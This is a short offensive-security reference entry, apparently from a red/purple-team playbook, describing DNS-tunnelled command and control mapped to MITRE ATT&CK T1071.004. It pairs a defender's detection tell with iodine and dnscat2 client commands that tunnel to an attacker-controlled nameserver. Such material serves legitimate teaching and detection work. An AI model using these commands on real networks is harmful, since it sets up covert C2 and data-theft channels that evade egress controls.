---
id: dns-tunnel-c2
title: DNS-tunnel C2 (iodine / dnscat2 / Sliver DNS)
section: Command & Control
phase: Command & Control
attack:
  tactic: TA0011
  techniques: [T1071.004]
platform: [windows, network]
source: MITRE ATT&CK TA0011; iodine / dnscat2 / Sliver DNS listeners
pair: dns-tunnel-sysmon-22
---

When only DNS egresses (guest wifi, segmented networks), tunnel C2 inside DNS
queries to an attacker-controlled authoritative nameserver: each beacon is encoded
into a long subdomain label and the reply rides a TXT/NULL/CNAME record. It is slow
and loud but reaches almost anywhere. The blue tell is the query shape — abnormally
long, high-entropy labels and a burst of unique names under one parent zone.

```sh
# iodine: IP-over-DNS to the delegated zone (attacker runs the authoritative NS)
iodine -f -P <shared-secret> <c2-domain>
# dnscat2 client -> attacker's dnscat2 server on the same delegated zone. The binary is
# `dnscat` (dnscat2-client is only the package name); the bare domain is the zone, and in
# `--dns`, `server=` would be the upstream RESOLVER, not the C2 zone.
dnscat --secret=<key> <c2-domain>
```
